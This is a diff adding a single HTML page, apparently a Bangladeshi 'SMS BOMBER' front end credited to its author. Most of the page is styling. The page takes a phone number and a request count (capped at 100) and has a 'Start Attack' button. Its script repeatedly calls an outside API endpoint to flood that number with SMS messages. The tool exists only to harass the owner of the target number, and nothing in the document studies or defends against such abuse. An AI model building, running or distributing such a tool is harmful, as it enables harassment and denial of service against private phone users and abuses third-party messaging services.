@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS BOMBER - PRITOM</title>
+    <meta name="theme-color" content=" #0ff">
+    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+    <link rel="icon" href="https://img.icons8.com/color/48/bomb-with-timer.png">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+        body {
+            font-family: 'EngFont', 'Orbitron', sans-serif;
+            background: linear-gradient(45deg, #0d0d0d, #1f1f1f, #2a2a2a);
+            background-size: 400% 400%;
+            color: #0ff;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            overflow: hidden;
+            font-size: 16px;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1635070041078-e363dbe005cb?q=80&w=2070&auto=format&fit=crop') center/cover no-repeat;
+            opacity: 0.15;
+            z-index: -1;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        h2 {
+            font-size: 1.8em;
+            text-shadow: 0 0 8px #0ff, 0 0 15px #00f;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            0% { text-shadow: 0 0 8px #0ff, 0 0 15px #00f; }
+            100% { text-shadow: 0 0 15px #0ff, 0 0 20px #00f; }
+        }
+
+        .container {
+            background: rgba(128, 211, 211, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            margin: 100px auto;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+            border: 2px solid #0ff;
+        }
+        /* Credits */
+        .credit {
+            margin: 5px 0;
+            font-family: 'Roboto', sans-serif;
+            font-size: 1rem;
+            color: #ddd;
+        }
+
+        .credit a {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .credit a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+        
+
+        input, button {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-size: 14px;
+            border: 2px solid #0ff;
+            background: #000;
+            color: #0ff;
+            text-align: center;
+            transition: 0.3s ease;
+        }
+
+        input:focus, button:focus {
+            outline: none;
+            border-color: #f00;
+            box-shadow: 0 0 10px #f00;
+        }
+
+        button {
+            background: linear-gradient(90deg, #0ff, #00f);
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+        }
+
+        button:hover {
+            background: linear-gradient(90deg, #f00, #ff0);
+            box-shadow: 0 0 10px #f00;
+            color: #fff;
+        }
+
+        #status {
+            margin-top: 1px;
+            font-size: 16px;
+            font-weight: bold;
+            color: rgb(23, 197, 130);
+            text-shadow: 0 0 10px lime, 0 0 15px green;
+            animation: statusPulse 1.5s infinite alternate;
+        }
+
+        @keyframes statusPulse {
+            0% { text-shadow: 0 0 10px lime, 0 0 15px green; }
+            100% { text-shadow: 0 0 20px lime, 0 0 25px green; }
+        }
+        /* Import Custom Font */
+        .circle-img {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    margin: 10px;
+    display: block;
+    border: 2px black;
+}
+/* Button Styling */
+.custom-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: #00aaff; /* Telegram Blue */
+    color: white;
+    padding: 12px 22px;
+    border: none;
+    cursor: pointer;
+    border-radius: 50px;
+    font-size: 16px;
+    transition: 0.3s ease-in-out;
+    font-weight: bold;
+    font-family: 'EngFont', sans-serif;
+    box-shadow: 0 4px 10px rgba(0, 136, 204, 0.5);
+    outline: none;
+    border: 2px solid transparent;
+}
+
+.custom-btn img {
+    width: 22px;
+    height: 22px;
+    filter: brightness(100%);
+}
+
+/* Hover Effect */
+.custom-btn:hover {
+    background: white;
+    color: #0088cc;
+    border: 2px solid #0088cc;
+    transform: scale(1.05);
+    box-shadow: 0 6px 15px rgba(0, 136, 204, 0.5);
+}
+
+.custom-btn:hover img {
+    filter: brightness(0) saturate(100%) invert(41%) sepia(92%) saturate(1701%) hue-rotate(180deg);
+}
+
+button:hover {
+    background: linear-gradient(45deg, #ff4b2b, #ff416c);
+    transform: scale(1.05);
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+}
+
+/* Animations */
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(-20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+body {
+    background-color: black;
+    color: red;
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+h1, h2 {
+    text-align: center;
+    animation: colorChangedev 15s infinite;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 20px;
+}
+p {
+    text-align: center;
+    animation: colorChangedev 2s infinite;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 16px;
+}
+AX {
+    color: red;
+    margin: 10px 0;
+    font-family: 'Brush Script MT', cursive;
+    font-size: 30px;
+}
+textarea {
+    width: 100%;
+    margin-bottom: 10px;
+    font-size: 16px;
+    color: cyan;
+    background-color: black;
+    border: 2px solid #ff0000;
+    border-radius: 5px;
+    border-color: red;
+    padding: 10px;
+}
+span {
+    transition: color 0.9s ease-in-out;
+}
+@media (max-width: 600px) {
+    .input-container {
+        width: 500%;
+    }
+    button {
+        width: 100%;
+    }
+}
+@keyframes colorChange {
+    5% {
+        background-color: black;
+    }
+    25% {
+        background-color: red;
+    }
+    45% {
+        background-color: orange;
+    }
+    65% {
+        background-color: lime;
+    }
+    85% {
+        background-color: cyan;
+    }
+    100% {
+        background-color: black;
+    }
+}
+@keyframes colorChangedev {
+    5% {
+        color: orange;
+    }
+    15% {
+        color: lime;
+    }
+    25% {
+        color: yellow;
+    }
+    35% {
+        color: red;
+    }
+    45% {
+        color: cyan;
+    }
+    55% {
+        color: purple;
+    }
+    65% {
+        color: blue;
+    }
+    75% {
+        color: white;
+    }
+    85% {
+        color: violet;
+    }
+    95% {
+        color: teal;
+    }
+}
+.ABDULLHA {
+            width: 120px;
+            height: 120px;
+            background: url('https://i.ibb.co/mCptZ3wr/PPPPPP.jpg') no-repeat center center;
+            background-size: cover;
+            border-radius: 50%;
+            margin: 0 auto;
+            border: 3px solid #0ff;
+}
+    .telegram-btn {
+        padding: 0.5rem 1rem;
+        font-size: 0.9rem;
+      }
+    .telegram-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0, 172, 237, 0.3);
+    }
+    .telegram-btn {
+      background: linear-gradient(to right, #0088cc, #00aced);
+      color: white;
+      padding: 0.6rem 1.2rem;
+      border-radius: 50px;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    </style>
+</head>
+<body>
+<center>
+    <div class="container">
+        <div class="ABDULLHA"></div>
+    	<AX id="animatedText">
+            <span>S</span><span>M</span><span>S</span>‎ ‎ <span>B</span><span>O</span><span>M<span>B</span><span>E</span><span>R</span></span>
+        </AX>
+        <input type="text" id="phone" placeholder="Enter Phone Number (Without +88)">
+        <input type="number" id="amount" placeholder="Enter Number of Requests (Max 100)">
+        <button onclick="sendRequests()">➤ Start Attack</button>
+        <p> <img src="https://cdn3.emoji.gg/emojis/8777_Approval.gif" height="14" width="14"> プリトム ビスワス <img src="https://cdn3.emoji.gg/emojis/8777_Approval.gif" height="14" width="14"></p>
+        <a href="https://www.facebook.com/PRITOMBISWAS77220" class="telegram-btn" target="_blank">
+            <i class="fab fa-facebook-f"></i>
+            <span>Facebook I'D</span>
+          </a>
+          <div id="status"></div>
+    </center>
+    </div>
+      </div>
+    <script>
+        async function sendRequests() {
+            let phone = document.getElementById("phone").value;
+            let amount = parseInt(document.getElementById("amount").value);
+            let statusDiv = document.getElementById("status");
+
+            if (!phone || isNaN(amount) || amount <= 0) {
+                alert("Please enter a valid phone number and amount!");
+                return;
+            }
+
+            if (amount > 100) {
+                alert("Maximum limit is 100 requests. Setting it to 100.");
+                amount = 100;
+                document.getElementById("amount").value = 100;
+            }
+
+            statusDiv.innerHTML = `<p>⚡ Sending ${amount} requests...</p>`;
+            
+            for (let i = 0; i < amount; i++) {
+                await fetch(`https://bomber-lyart.vercel.app/api/free-palestine?phone=${phone}`)
+                .catch(error => console.error("Request Failed:", error));
+
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+
+            statusDiv.innerHTML = `<p>✅ All ${amount} requests sent!</p>`;
+        }
+    </script>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+     const colors = ["black", "white", "red", "blue", "green", "orange", "purple", "cyan", "pink", "yellow"];
+     const textSpans = document.querySelectorAll("#animatedText span");
+     function changeColors() {
+         textSpans.forEach((span, index) => {
+             setTimeout(() => {
+                 span.style.color = colors[Math.floor(Math.random() * colors.length)];
+             }, index * 500);
+         });
+     }
+     setInterval(changeColors, 1000);
+ });
+</script>
+</body>
+</html>
